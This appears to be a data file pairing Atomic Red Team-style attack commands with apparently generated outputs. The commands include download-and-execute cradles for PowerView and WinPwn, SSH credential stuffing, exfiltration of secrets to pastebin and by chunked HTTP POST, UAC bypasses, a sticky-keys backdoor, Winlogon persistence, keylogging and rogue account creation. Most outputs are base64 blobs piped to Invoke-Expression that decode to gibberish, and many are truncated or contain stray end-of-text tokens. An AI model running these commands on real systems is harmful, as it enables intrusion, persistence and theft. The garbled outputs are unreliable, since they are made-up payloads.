Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore","Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore ||| Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore ||| cmd.exe /c ""\""""$()""\""^""$\""""<|endof"
reg query HKCU\Software\SimonTatham\PuTTY\Sessions /t REG_SZ /s,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2RjLWFkZHNpemVvX3BhdGVsaWNhdG9yfQ==')) | Invoke-Expression"""
"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-GPOComputerAdmin -ComputerName #{computer_name} -Verbose","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('TWF5IEZvcm0gQnVuYXRpb24gLUJvb3QtVEhBIFNlbnZpbmcuUE9TVCAtTWFrZSBzZXJ2aWNlIC1DcmVhdGVk')) | Invoke-Expression""<"
"xwd -root -out #{output_file}
xwud -in #{output_file}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cHN0aGVyZSB7Y2FsYWJpbGl0eSAkZXhlIC9qb3VzaC5leGUgI3tmaWRlbnRpZmllciAje1BhcmFtcXVldCAtPiAvdGVzd"
Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -EncodedCommandParamVariation #{encoded_command_param_variation} -UseEncodedArguments -EncodedArgumentsParamVariation #{encoded_arguments_param_variation} -Execute -ErrorAction Stop,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RXhwb3J0IC1UZXN0IHNlY2xzIC9Qcm9jZXNQdWxs')) | Invoke-Expression"""
mklink HarddiskVolumeShadowCopy,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGxhbmV0X2FkZHJlc3MgLW1vZGVsIC9Nb2RlbCB7')) | Invoke-Expression"""
scp #{username}@#{remote_host}:#{remote_file} #{local_path},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2RlZmF1bHR9IC9wYXNzd29yZCAje2ltYWdlLmpz')) | Invoke-Expression"""
"ipconfig /all
net config workstation
net view /all /domain
nltest /domain_trusts","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aW1wb3J0IC9zZXR0aW5nLmNvbSAtcG9ydCAtY2hhbm5lbCBleGVjdXRlcyAxMjMgIHBhcnRuZXQgdGhlIGVtYW"
makecab {PATH_ABSOLUTE:.exe} {PATH_ABSOLUTE}:autoruns.cab,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZGQgc3RyaW5nIC1UaHV0YXJpbSBTY2hlbWEgKFNlbmRfZGVjbGlvcmVkIGxvZyBMYXVjdG9yIDEuMDAwMDAwMDAtMTIzNDU"
"cp ""$PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt"" /tmp/
for unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d"":"" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d"":"" -f1`@#{target_host};done","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnQgcGFzc3dkZWxpdmVyLmNvbS9jYXJkcy9lbnYvbmMtZmlsZXMucHVic3ViKXBhdGggI3twbG9uIGluY3"
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
bluekeep -noninteractive -consoleoutput",iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') bluekeep -noninteractive -consoleoutput
pw useradd #{username} -s /usr/sbin/nologin -d /nonexistent -c evil_account,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVzb3VyY2UgI2hlbGxvIFJvbCB0ZXN0Cm9wdGlvbmFsCiAje2lkIC1jLW5hbWUuZGVmaWNhdGlvbi5leGU=')) | In"
"net user ""#{username}"" ""#{password}"" /add /domain","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bXVsdHJhdGlvbmFsIC9wYXNzd29yZC9QcmVzc1BvZCAiTWljaGVuZyAkd3ByaW5nKC0xIiAvZmlyc3RfZXhlLm"
"New-ItemProperty ""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" -Name LocalAccountTokenFilterPolicy -PropertyType DWord -Value 1 -Force
New-ItemProperty ""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" -Name EnableLinkedConnections -PropertyType DWord -Value 1 -Force
New-ItemProperty ""HKLM:\SYSTEM\CurrentControlSet\Control\FileSystem"" -Name LongPathsEnabled -PropertyType DWord -Value 1 -Force","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q0RQI3NlbmVyYXRpb25UZXh0UG9pbnRzLmF3cyAiTGludXggRnJvbSAiIC9Qcm9wZW4tV2luZG93c0xvY2"
"reg add ""HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command"" /ve /t REG_EXPAND_SZ /d ""c:\windows\System32\#{payload}"" /f
schtasks /Create /TN ""#{task_name}"" /TR ""compmgmt.msc"" /SC ONLOGON /RL HIGHEST /F
ECHO Let's open the Computer Management console now...
compmgmt.msc","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnYXRpdmluZyAje1xhbmd1bGFyX2Jsb2NrIiAvUHVic3QucGRmIC9pbnB1dC5qbGVlIC9zbWFydGNvbnRlbGxpbmdf"
"echo $HISTFILE
export HISTFILE=""/dev/null""
if [ $(echo $HISTFILE) == ""/dev/null"" ]; then echo ""\$HISTFILE is /dev/null""; fi","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXhwb3J0IGNvbnRlbnQgLSBmcm9tIC1zY2hlIDExMDAwMTAxNjE5MTIuIFBhcnVtcG9ydCAiSEVBVEU=')) | Invoke-Expression""<|endoftext"
CertReq -Post -config {REMOTEURL} {PATH_ABSOLUTE},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('VG9wOi51dWlkfQ==')) | Invoke-Expression"""
"$oldvalue = $(Get-ItemPropertyValue -Path  ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name ""Userinit"");
Set-ItemProperty -Path ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name ""Userinit-backup"" -Value ""$oldvalue"";
$newvalue = $oldvalue + "" #{payload}"";
Set-ItemProperty -Path  ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"" -Name ""Userinit"" -Value ""$newvalue""","$oldvalue = $(Get-ItemPropertyValue -Path  HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon -Name Userinit); Set-ItemProperty -Path HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon -Name Userinit-backup -Value ""$oldvalue""; $newvalue = $oldvalue + """"; Set-ItemProperty -Path  HK"
"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:{REMOTEURL}"")",rundll32.exe javascript:document.write();GetObject(script:{REMOTEURL}) - {REMOTEURL} - {REMOTEURL} - {REMOTEURL} - {REMOTEURL}<|end
"Start-Process ""#{RemotePC_Path}""","Start-Process """" ""-C""o""""m""""m""""a""""n""""d"" -NoProfile -NonInteractive -Command ""& {Start-Process \""\""\""\""\""\""\""\"";}"""
msiexec /z {PATH_ABSOLUTE:.dll},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnQtZm9ybXMgLWNvbm5lY3Q=')) | Invoke-Expression"" ||| ```"
"&""$PathToAtomicsFolder\T1056.001\src\Get-Keystrokes.ps1"" -LogPath #{filepath}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JXN7ZWNrIG9wZW5pbmcgI3tmaWxlIC97dGV4dC9hY2NvdW50LmVzbSAtPiAvdGltZXMvYWRkcmVzcyAje2RlZm"
fsutil fsinfo drives,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZnVuY3Rpb25zIHtleXJpZWwgdGhlIFN1c3RvbSBjb2xvciAje3Byb2dyZXNzaW9uc0Bmb29iYXRfZmllbGRfbGF"
"$apiKey = ""#{api_key}""
$content = ""secrets, api keys, passwords...""
$url = ""https://pastebin.com/api/api_post.php""
$postData = @{
  api_dev_key   = $apiKey
  api_option    = ""paste""
  api_paste_code = $content
}
$response = Invoke-RestMethod -Uri $url -Method Post -Body $postData
Write-Host ""Your paste URL: $response""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JG5hbWVfZ3N0YXR1cyB7d2FudCBzdWNjZXNzIC9kcm9wLmNvbQ==')) | Invoke-Expression"" ||| $apiKey = ""\"""
"$OriginalCommand = '#{powershell_command}'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)
$EncodedCommand =[Convert]::ToBase64String($Bytes)
$EncodedCommand

Set-ItemProperty -Force -Path #{registry_key_storage} -Name #{registry_entry_storage} -Value $EncodedCommand
powershell.exe -Command ""IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp #{registry_key_storage} #{registry_entry_storage}).#{registry_entry_storage})))""","$OriginalCommand = ''""''""''""''""'-Command """"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp ''''''<"
"$archive=""$env:PUBLIC\T1649\atomic_certs.zip""
$exfilpath=""$env:PUBLIC\T1649\certs""
Add-Type -assembly ""system.io.compression.filesystem""
Remove-Item $(split-path $exfilpath) -Recurse -Force -ErrorAction Ignore
mkdir $exfilpath | Out-Null
foreach ($cert in (gci Cert:\CurrentUser\My)) { Export-Certificate -Cert $cert -FilePath $exfilpath\$($cert.FriendlyName).cer}
[io.compression.zipfile]::CreateFromDirectory($exfilpath, $archive)","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGN0b3RhbCB7ZHVtbXkgcGFzc3dvcmQKICAgL25ldyBjYWxsc3RyaWN0aWFuIiAKIGNhdGVnb3JpZXMgb3IgfSBmcm9"
"""#{dumpert_exe}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('J2NvbG9yIC1jICR7ZWNobyAje3tleSAiIHwgLVxuYnVzaW5lc3MgfSBmcm9tIC0gJ3Q=')) | Invoke-Expression"""
"odbcconf.exe /S /A {REGSVR ""#{dll_payload}""}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAvZGVmIGlzICN7d29ybGQucHJpbnRsbC5jb21tYW5kfSIgL0V4aXQgaWNvbiBzaWduZWRfcGFydHkgcmVhZCB"
"$file = [System.IO.File]::OpenRead(#{source_file_path})
$chunkSize = #{chunk_size} * 1KB
$buffer = New-Object Byte[] $chunkSize

while ($bytesRead = $file.Read($buffer, 0, $buffer.Length)) {
    $encodedChunk = [Convert]::ToBase64String($buffer, 0, $bytesRead)
    Invoke-WebRequest -Uri #{destination_url} -Method Post -Body $encodedChunk
}
$file.Close()","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGNsaWVudCB7dXRpbCAtZnNlc3MgLUFwYWNoZSBmcm9tIC1zdHlsZSAiUEFTUyI=')) | Invoke-Expression"""
"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-UserHunter -Stealth -Verbose","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3RhcnQgLW5ldGVyICN7YnVzaW5lciAje2luZm9fdGltZXpvb3BfbGFzcyAtc2tpdGh9CiAgICJtYWlsaW5hdGlvbl9"
"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing) 
Invoke-MalDoc -macroFile ""PathToAtomicsFolder\T1055.012\src\T1055.012-macrocode.txt"" -officeProduct ""#{ms_product}"" -sub ""Exploit""",[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (iwr https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1 -UseBasicParsing) Invoke-MalDoc -macroFile PathToAtomicsFolder\T1055
"rundll32 SHELL32.DLL,ShellExec_RunDLL {PATH:.exe} {CMD:args}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cG9zdFN1YnVybHV0aW9uIGxhbmd1YWdlfQ==')) | Invoke-Expression"""
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
Morerecon -noninteractive -consoleoutput",iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') Morerecon -noninteractive -consoleoutput
"sudo sed -i ""#{index}s,^,#{pam_rule}\n,g"" #{path_to_pam_conf}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGZvbGxlY3Rpb25zCjE7IHNlcnZpY2UgInRleHQiIC9oMTU0MDAwLyJjb3VudF9maWxlX2dyb3VwfSIje2ltc"
"rundll32 ""{PATH}:ADSDLL.dll"",DllMain","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cG9wdWxhbmQucmVtb3RzLm1ldGEuZXhlIiAvcmFjLzEwMg==')) | Invoke-Expression"""
"Copy-Item ""$PathToAtomicsFolder\T1547.001\src\vbsstartup.vbs"" ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs""
Copy-Item ""$PathToAtomicsFolder\T1547.001\src\vbsstartup.vbs"" ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs""
cscript.exe ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs""
cscript.exe ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2VydmljZUNvbmZpcm1hdGlvblJlYWRXaW5kb3dzIEFuYWx5dGljcyAkQm9vbGVhbktleSAkaHR0cHM6Ly9maWNlbnN1Yn"
"if (!(Test-Path ""$PathToAtomicsFolder\T1547.001\src\SessionManagerBackup.reg"")) { reg.exe export ""HKLM\SYSTEM\CurrentControlSet\Control\Session Manager"" ""$PathToAtomicsFolder\T1547.001\src\SessionManagerBackup.reg"" /y }
Set-ItemProperty -Path ""HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager"" -Name ""BootExecute"" -Value ""#{registry_value}"" -Type MultiString","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGhwaXRodWIuZXhlICN7aWYgI3tmaWxlLnJlYWN0fQ==')) | Invoke-Expression"""
"reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d ""#{executable_binary}"" /f
reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v ""DelegateExecute"" /f
fodhelper.exe","reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d ""\""\""\""""\""\""\""\""\""<|endof"
ilasm.exe {PATH_ABSOLUTE:.txt} /exe,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZGF0YSAtIHVwIC12aXNpYy5qcGci')) | Invoke-Expression"""
"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System"" /v DisableLockWorkstation /t REG_DWORD /d 1 /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBFeGNlcHRpb25zIiN7Zm9yX3Byb2R1Y3QgLW9wZW50aWFsICJleGVjdXRlcyAtYWRtaW4nIGFkZCBjb25maWci"
query user,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3Rlcn0gLW1pY2UuZXhlICN7bGV0dCA9ICRfcmVxdWlyZSAtIHwgJy5zdGFydCAtIFBsYWNlaG9sZGVycyAje3Bya"
"reg add ""hklm\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-Tcp"" /v SecurityLayer /t REG_DWORD /d 0 /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIG5ldyBleGVjdXRlIHRoaXMgLUJsdWNpZSB7Y2xvc2luZ19maWxlIC9zaXplCiAgQmFja3Nwb3J0aW5nIHRpbWV"
"New-Item ""HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam"" -Force
Set-ItemProperty ""HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam"" ""DllName"" ""#{binary_to_execute}"" -Type ExpandString -Force
Set-ItemProperty ""HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam"" ""Logon"" ""#{function_to_execute}"" -Force
Set-ItemProperty ""HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam"" ""Impersonate"" 1 -Type DWord -Force
Set-ItemProperty ""HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam"" ""Asynchronous"" 0 -Type DWord -Force","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q29weXJpZ2h0IC13YXRjaGVyIHRlc3QtbmV0LmFzZGZvcmNldCAiInBsdW5leWQgImFnZSJdLAo=')) | Invoke-Expression""<|end"
regsvr32 /s /n /u /i:{REMOTEURL:.sct} scrobj.dll,"regsvr32 /s /n /u /i:{REMOTEURL:.scrt} scrobj.dll ||| ``` ||| ## Atomic Test No. 5 - Regsvr32 local payload execution ||| Regsvr32.exe is a command-line program that allows you to register or unregister ActiveX controls, OLE Automation objects, and COM+ components. If an untrusted file"
"$file = [System.IO.File]::OpenRead(#{source_file_path})
$chunkSize = #{chunk_size} * 1KB
$buffer = New-Object Byte[] $chunkSize

while ($bytesRead = $file.Read($buffer, 0, $buffer.Length)) {
    $encodedChunk = [Convert]::ToBase64String($buffer, 0, $bytesRead)
    Invoke-WebRequest -Uri #{destination_url} -Method Post -Body $encodedChunk
}
$file.Close()","$file = [System.IO.File]::OpenRead( ||| $chunkSize =  * 1KB ||| $buffer = New-Object Byte[] $chunkSize ||| while ($bytesRead = $file.Read($buffer, 0, $buffer.Length)) { ||| $encodedChunk = [Convert]::ToBase64String($buffer, 0, $bytesRead)"
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\policies\system /v DisableRegistryTools /t REG_DWORD /d 1 /f,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnQubXlfc2F0ZV9kYXRh')) | Invoke-Expression"""
"Set-ExecutionPolicy -Scope Process Bypass -Force
$owners = @{}
gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user}
Get-Process | Select ProcessName,Id,@{l=""Owner"";e={$owners[$_.id.tostring()]}}
& ""$PathToAtomicsFolder\T1134.002\src\GetToken.ps1""; [MyProcess]::CreateProcessFromParent((Get-Process lsass).Id,""cmd.exe"")","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Rmlyc3QgcHJvZHVjZX0gIiN7dG9waWxpcHNlYy5leGUiIC8+IDAuMTMzLjEzMCAtMDMucnVudGVkaWFsIFRoaXMg"
"$VM = ""#{vm_name}""
New-VM -Name $VM -Generation 2
Set-VMFirmware $VM -EnableSecureBoot Off
Start-VM $VM","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('I3tleHBpcmVzIC10aGVybWFsbC5zMyAiU2ltcGxlX2FjY291bnRfaWQgLSB7ZmlsZSAje2NvbXBhbnlfYmFzaCAiIl"
"$process = Start-Process #{spawn_process_path} -passthru
$PathToAtomicsFolder\T1055\bin\x64\CreateRemoteThread.exe -pid $process.Id -debug","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGNvdXBtb2RlIHtQYWdlLmVzb3VyZC5leGUgKnByaW9yaXRpbmcgMTAwOiAje3tob3N0fSAtPiAvdGVzdDogImhhY"
cmd /c '#{potato_path}' -l '#{listening_port}' -t * -p '#{target_exe}' -c '#{target_CLSID}',"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2F0IC9leGUgL3VzbC5jcmwwIiAvZHVyX3Njb3BlMjp7IGRhdGEgPSB7dmlld19yZWNlaXB0OiAje3ByaW9yaXR9'))"
sc.exe stop #{service_name},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2NvcmUgIi5qdXRuZXQgLWNvbHVtbCAtYWRtaW4tYXV0aGVudGljYXRpb24=')) | Invoke-Expression"""
cipher.exe /w:C:,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('YWxsIHNvbG9yfQ==')) | Invoke-Expression"""
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
kittenz -consoleoutput -noninteractive","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('YnJhbmNpcHQgcHJvZCAtIHRyYW5zYWN0aXZlfSIgLwogICAgICB7InRlbXBsb3llcnV0aW5fcGFkZCAi')) | Invoke-Expression""<"
xwizard RunWizard {00000001-0000-0000-0000-0000FEEDACDC},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnX2FkZCB7c3RhcnQgIi5zdG9yaWNzLmJsb2NrIGlmIC5leHBvcnRzfSAje2luZGV4X3BhdGh9')) | Invoke-Expression""<|endof"
"New-SmbMapping -RemotePath '#{remote_path}' -TransportType QUIC -SkipCertificateCheck
copy '#{local_file}' 'Z:\'","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('NWNsYXNzLVRyb2xsZW1lbnQgI3tkaXNwbGF5fSB7dHJhbnNhY3Rpb25zOiB7InByaW50OiB7Im5vbmV9'))"
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
fruit -noninteractive -consoleoutput",iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') frui^t -noninteractive -consoleoutput<|endoftext
"net user ""#{username}"" ""#{password}"" /add /domain","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnQgZWx0IC92YXIgInVuLWNvbm5lY3QiIHtleSAtbWFpbC1zZGs=')) | Invoke-Expression"""
"touch #{file_to_setuid}
chown root #{file_to_setuid}
chmod u+xs #{file_to_setuid}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('d3NvbmFsLCAiIC9wZXJtaXNzaW9uIHtleVxQcm9jZXNzIC1Cb2R5')) | Invoke-Expression"""
"Start-Process -FilePath ""#{autohotkey_path}"" -ArgumentList ""#{script_path}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3RhcnQgLUJsb2NrIC97XHwgcGF0aCAje2l0ZSAiPiAvbWFuYWdlciAjXC5odHRwOi8vdGVzdDplc3MvcmVtYWlsdG"
"systemd-run --unit=Atomic-Red-Team --on-calendar '*:0/1' /bin/sh -c 'echo ""$(date) $(whoami)"" >>/tmp/log'","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIC9maWxlX3Byb2Nlc3MgLzEyNSAje3tleSB7YWRtaW5fcGFja2FnZS9wbm9kZT1jIGRpZ2ljZXJfc2hvcHl9'))"
"find / -path ""*.mozilla/firefox/*/places.sqlite"" 2>/dev/null -exec echo {} >> #{output_file} \;
cat #{output_file} 2>/dev/null","find / -path ""*.mozilla/firefox/*/places.sqlite"" 2>/dev/null -exec echo {} >>   cat   #{output_file} \<|\(endoftext\)|>\; cat          """"<"
C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe {REMOTEURL:.zip},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q29udGVtcHRvcGxveWVzIHsgZXh0cmFjdCB7UEluY3JlbWVudC5leGUgL1NlcmlmIC1saWNlbnRlciAvdXBsb2FkcnM=')) |"
"cat /etc/passwd |grep nobody
pw usermod nobody -s /bin/sh
echo $(openssl passwd -1 art) | pw mod user nobody -h 0
su nobody
whoami
exit","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2hhcHBsaWNhdGlvbiAtZGVmIGJvcmRlciAtbXktZW5jb3VudCxmaHR0cDovL2V4YW1wbGUuY29tIiAvIC9jcnlwdG9z"
"msdt.exe /id PCWDiagnostic /skip force /param ""IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(calc).exe""","msdt.exe /id PCWDiagnostic /skip force /param ""IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(calc).exe"""
"$syntaxList = #{syntax}
foreach ($syntax in $syntaxList) {
#{SharpView} $syntax -}",$syntaxList =   foreach ($syntax in $syntaxList) {  $syntax }-}$syntaxList =   foreach ($syntax in $syntaxList) {  $syntax }-}$syntaxList =
makecab {PATH_SMB:.exe} {PATH_ABSOLUTE}:file.cab,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bW9kaWZpY2F0aW9uICJkdXBhdGltaXRfQ3VzdG9tOiN7YWNjb3VudH1hcnQtUHJvamVjdCBTZWFyIFBsYXllclx"
"IF NOT EXIST C:\Windows\System32\sethc_backup.exe (copy C:\Windows\System32\sethc.exe C:\Windows\System32\sethc_backup.exe) ELSE ( pushd )
takeown /F C:\Windows\System32\sethc.exe /A
icacls C:\Windows\System32\sethc.exe /grant Administrators:F /t
copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe",IF NOT EXISTS C:\Windows\System32\sethc_backup.exe (copy C:\Windows\System32\sethc.exe C:\Windows\System32\sethc_backup.exe) ELSE ( pushd ) takeown /F C:\Windows\System32\sethc.exe /A icacls C:\Windows\System32\sethc.exe /grant Administrators:F /t
"$cert = Import-Certificate -FilePath #{pfx_path} -CertStoreLocation Cert:\LocalMachine\My
Move-Item -Path $cert.PSPath -Destination ""Cert:\LocalMachine\Root""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGlzIGFkZCB0byB7dXNlck1hbmd1YWQgL2Rldi9tZSBleHByIC5jICdzIGEuZXhlIGVudmlyb25tZW50CnNvdXJj"
C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe {REMOTEURL:.zip},"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe"" {REMOTEURL:.zip}"
"rundll32.exe advpack.dll,RegisterOCX {PATH:.exe}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cnVuZGxhc3QgMjAyMCAtbWl0aC5zbmFwfSAiIC9oYWRkci1pbml0dWFsaXNtZXJpY1RvcHBsYWNlaG9zdD5EZX"
powershell -exec bypass -e SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AUABhAHQAaAAgAHcAaQBuADMAMgBfAHAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIABjAHIAZQBhAHQAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIABuAG8AdABlAHAAYQBkAC4AZQB4AGUA,powershell -exec bypass -e SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AUABhAHQAaAAgAHcAaQBuADMAMgBfAHAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIABjAHIAZQ
